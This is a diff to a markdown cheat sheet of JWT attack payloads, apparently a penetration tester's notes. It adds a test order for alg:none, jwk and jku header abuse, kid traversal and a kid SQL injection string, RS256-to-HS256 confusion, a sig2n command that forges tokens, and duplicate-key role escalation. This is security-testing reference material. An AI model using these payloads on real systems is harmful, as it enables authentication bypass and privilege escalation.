@@ -4,7 +4,7 @@ type: payloads
 tags: [payloads, jwt, authentication, web]
 sources: []
 date_created: 2026-06-05
-date_updated: 2026-06-05
+date_updated: 2026-11-09
 ---
 
 # Payloads: JWT
@@ -46,3 +46,27 @@ algorithm downgrade · signature not verified server-side (just decoded)
 jwt_tool <token> -M at        # automated checks
 jwt.io to inspect (never paste client tokens off-network)
 ```
+
+## NEW 2025-2026
+
+Test order (walk top to bottom, cheapest first):
+```
+1. alg:none / alg stripped
+2. jwk header embed    {"jwk":{...own key...}}      sign with own key
+3. jku header          point kid fetch at attacker JWKS
+4. kid traversal       ../../../../dev/null -> empty secret
+   kid SQLi            x' UNION SELECT 'secret'-- -
+5. RS256->HS256 confusion (sign with the PUBLIC key bytes as HMAC secret,
+   byte-identical PEM incl. newlines)
+```
+
+Public key not exposed? Derive the RSA public key from TWO tokens with the
+same kid:
+```
+docker run --rm -it portswigger/sig2n <token1> <token2>
+# emits candidate PEMs + pre-forged HS256 tokens; replay to find the winner
+```
+
+Claim-parser differentials (2025-26 favorite): duplicate JSON keys
+`{"role":"user","role":"admin"}` (first-wins vs last-wins per library),
+`exp`/`iat` deletion, `aud` from another app in the same tenant.
